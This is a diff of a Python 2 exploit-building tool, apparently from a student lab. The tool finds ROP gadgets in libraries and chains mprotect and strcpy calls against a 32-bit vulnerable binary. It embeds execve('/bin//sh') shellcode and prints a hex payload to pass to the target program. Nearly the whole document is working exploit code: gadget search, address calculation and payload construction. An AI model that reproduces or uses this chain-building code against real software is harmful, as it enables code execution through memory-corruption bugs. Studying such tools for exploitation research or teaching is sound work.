@@ -12,7 +12,7 @@ register_list = ["eax", "ebx", "ecx", "edx", "esi", "edi", "ebp"]
 #buf_address = 0xbfffeda8
 
 #neeraj machine
-buf_address = 0xbffff128 
+buf_address = 0xbffff158 
 buf_len = 256
 packed_shellcode = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
 
@@ -682,33 +682,26 @@ def build_rop_chain_libc(lib_list):
 
     mprotect_offset = get_function_address(elffile, "mprotect")
     mprotect_addr = pack_value(libc_base_address + mprotect_offset)
+    print 'Address of mprotect = 0x%x' %(mprotect_offset + libc_base_address)    
 
     strcpy_offset = get_function_address(elffile, "__strcpy_g")
     strcpy_addr = pack_value(libc_base_address + strcpy_offset)
+    print 'Address of strcpy = 0x%x' %(strcpy_offset + libc_base_address)
 
     null_byte_location = pack_value(libc_base_address + find_null_byte(elffile))
+    print 'NULL byte address = 0x%x' %(libc_base_address + find_null_byte(elffile))
 
-    pop2_ret_offset = None
-    for entry in lib_list:
-        pop2_ret_offset = find_pop2_ret(entry[0])
-        if pop2_ret_offset != None:
-            pop2_addr = pack_value(entry[1] + pop2_ret_offset)
-            break    
+    pop2_addr = pack_value(find_gadget_addr(lib_list, find_pop2_ret))
+    if pop2_addr == 0:
+        print 'No gadget found for pop, pop, ret;'
+        return False
+    print 'Address of pop, pop, ret; = 0x%x' %(find_gadget_addr(lib_list, find_pop2_ret))    
 
-    if pop2_ret_offset == None:
-        print 'Unable to find pop2_ret gadget !'
-        exit(1)
-    
-    pop3_ret_offset = None
-    for entry in lib_list:
-        pop3_ret_offset = find_pop3_ret(entry[0])
-        if pop3_ret_offset != None:
-            pop3_addr = pack_value(entry[1] + pop3_ret_offset)
-            break
-
-    if pop3_ret_offset == None:
-        print 'Unable to find pop3_ret gadget'
-        exit(2)
+    pop3_addr = pack_value(find_gadget_addr(lib_list, find_pop3_ret))
+    if pop3_addr == 0:
+        print 'No gadget found for pop, pop, pop, ret;'
+        return False
+    print 'Address of pop, pop, pop, ret; = 0x%x' %(find_gadget_addr(lib_list, find_pop3_ret))
 
     memory_start_address = ((buf_address >> 12) << 12)
     memory_length = 0x1000
@@ -748,7 +741,7 @@ def build_rop_chain_libc(lib_list):
 def print_rop_payload(buf):
     rows, columns = os.popen('stty size', 'r').read().split()
     print "#"*int(columns)
-    print "Run the following command as the argument of vuln2 to reproduce this exploit.\n"
+    print "Run the following command as the argument to vulnerable program\n"
     print "#"*int(columns)
     bufstr = buf.encode("hex")
     i = 0
@@ -760,7 +753,7 @@ def print_rop_payload(buf):
     print ""
     print "#"*int(columns)
 
-def get_binary_instr(filename):
+def get_binary_instr(filename, print_gad):
     gadget_map = {}
     unique_gadget_map = {}
 
@@ -795,8 +788,9 @@ def get_binary_instr(filename):
             find_gadgets(finiSection, finiStartAddr, gadget_map, unique_gadget_map)
 
         disassembled_map = build_disassembled_gadgets_map(unique_gadget_map)
-        print_gadgets(unique_gadget_map)
-        print str(len(unique_gadget_map)) + " unique gadgets found." 
+        if print_gad: 
+            print_gadgets(unique_gadget_map)
+            print str(len(unique_gadget_map)) + " unique gadgets found in %s" %(filename) 
         return disassembled_map
     return None 
 
@@ -823,32 +817,26 @@ def find_library_base_addr(vuln_binary, library_path):
 if __name__ == '__main__':
 
     parser = argparse.ArgumentParser('ROP-Chain-Compiler')
-    parser.add_argument("vuln_bin", type=str, help="Path to 32 bit x86 binary which is to be exploited")
-    parser.add_argument("-lib", type=str, help="Path to libraries which are linked along with base addresses")
+    #parser.add_argument("vuln_bin", type=str, help="Path to vulnerable binary (ROP tester)")
+    vuln_bin = 'mprotect-shellcode/vuln2' 
+    parser.add_argument("lib", type=str, help="Libraries which are linked in vulnerable binary")
+    parser.add_argument("-p", action='store_true', help="Print all gadgets") 
     args = parser.parse_args()
     
     lib_list = []
-    if args.lib:
-        #print 'Optional libraries provided are %s' %(args.lib)
-        libraries = args.lib.split(' ')
-        for entry in libraries:
-            disas_map = get_binary_instr(entry)
-            if disas_map == None:
-                print '%s library not present !' %(entry)
-                exit(1)
+    libraries = args.lib.split(' ')
+    for entry in libraries:
+        disas_map = get_binary_instr(entry, args.p)
+        if disas_map == None:
+            print '%s library not present !' %(entry)
+            exit(1)
 
-            base_addr = find_library_base_addr(args.vuln_bin, entry)
-            if base_addr == None:
-                print 'Unable to get base address for library %s' %(entry)
-                exit(1)
-            lib_list.append((disas_map, base_addr, entry))
+        base_addr = find_library_base_addr(vuln_bin, entry)
+        if base_addr == None:
+            print 'Unable to get base address for library %s' %(entry)
+            exit(1)
+        lib_list.append((disas_map, base_addr, entry))
     
-    disas_map = get_binary_instr(args.vuln_bin)
-    if disas_map == None:
-        print '%s binary not present !' %(args.vuln_bin)
-        exit(2)
-    lib_list.append((disas_map, 0, args.vuln_bin))
+    #build_rop_chain_libc_syscalls(lib_list)
+    build_rop_chain_libc(lib_list)
     
-
-    #build_rop_chain_libc(lib_list)
-    build_rop_chain_libc_syscalls(lib_list)
